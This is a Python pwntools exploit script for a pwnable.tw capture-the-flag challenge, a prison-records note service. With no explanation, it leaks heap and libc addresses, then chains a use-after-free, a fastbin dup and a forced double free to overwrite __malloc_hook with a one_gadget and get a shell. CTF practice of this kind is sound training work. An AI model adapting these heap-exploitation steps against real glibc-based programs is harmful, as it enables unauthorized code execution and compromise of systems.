from pwn import *

io = remote('chall.pwnable.tw', 10400)

def list_all():
    io.recvuntil('> ')
    io.sendline('list')

def note(cell, size, note):
    io.recvuntil('> ')
    io.sendline('note')
    io.recvuntil('Cell: ')
    io.sendline(str(cell))
    io.recvuntil('Size: ')
    io.sendline(str(size))
    if note:
        io.recvuntil('Note: ')
        io.send(note)

def punish(cell):
    io.recvuntil('> ')
    io.sendline('punish')
    io.recvuntil('Cell: ')
    io.sendline(str(cell))

def leak_heap():
    list_all()
    io.recvuntil('Sentence: Life imprisonment, multiple homicides\nNote: ')
    return io.recv(8)

def leak_libc():
    list_all()
    io.recvuntil('Sentence: Life imprisonment, psychopath, contract killer\nNote: ')
    return io.recv(8)

def gen_chunk_payload(cell, size, addr, next_prisoner):
	payload = p64(0) + p64(0x51) + p64(heap_base) * 3 + p32(0) + p32(cell)
	payload += p64(heap_base) + p32(size) + p32(0) + p64(addr) + p64(next_prisoner)
	payload += p64(0) + p64(0x21) + p64(0) * 2
	payload += p64(0) + p64(0x21) + p64(0) * 2
	payload += p64(0) + p64(0x31) + p64(0) * 4
	return payload

# leak heap address
note(0, 0x28, b'A')
note(1, 0x28, b'A')
note(0, 0xd8, b'A') # free 0
note(1, 0x38, b'A') # free 1
note(2, 0x28, b'0')
heap_leak = u64(leak_heap())
heap_base = heap_leak - 0x12430

# leak libc address
note(3, 0x88, b'A')
note(4, 0x48, b'A') # guardian
note(3, 0x98, b'A') # free 3
note(5, 0x88, b'\x78')
libc_leak = u64(leak_libc())
libc_base = libc_leak - 0x3c3b78
__malloc_hook = libc_base + 0x3c3afd
one_gadget = libc_base + 0xef6c4

# use after free
payload = p64(heap_base) * 3 + p32(0) + p32(9) + p64(heap_base)
payload += p32(0x1000) + p32(0) + p64(heap_base + 0x12160) + p64(heap_base + 0x122f0)
punish(9)
note(4, 0x48, b'\0' * 3 + p64(one_gadget))
note(9, 0x48, payload)

# fastbin dup
payload = gen_chunk_payload(6, 0x68, heap_base + 0x124a0, heap_base + 0x12050)
payload += gen_chunk_payload(7, 0x68, heap_base + 0x12510, heap_base + 0x12170)
payload += gen_chunk_payload(8, 0x68, heap_base + 0x124a0, heap_base + 0x12230)
payload += gen_chunk_payload(9, 0x1000, heap_base + 0x12160, heap_base + 0x122f0)
payload += p64(0x30) + p64(0x30) + p64(heap_base + 0x12430) + p64(0) * 3
payload += (p64(0) + p64(0x71) + p64(0) * 12) * 2
note(9, 0x1000, payload)
note(6, 0x78, b'A')
note(7, 0x78, b'A')
note(8, 0x78, b'A')

payload = gen_chunk_payload(6, 0, heap_base + 0x124a0, heap_base + 0x12050)
payload += gen_chunk_payload(7, 0, heap_base + 0x12510, heap_base + 0x12170)
payload += gen_chunk_payload(8, 0, heap_base + 0x124a0, heap_base + 0x12230)
note(9, 0x1000, payload)
note(6, 0x68, p64(__malloc_hook))
note(7, 0x68, b'A')
note(8, 0x68, b'A')
note(4, 0x68, None)

# double free -> trigger malloc_printerr -> trigger __malloc_hook
payload = gen_chunk_payload(6, 0x48, heap_base + 0x12a50, heap_base + 0x12050)
note(9, 0x1000, payload)
note(6, 0x58, None)

io.interactive()
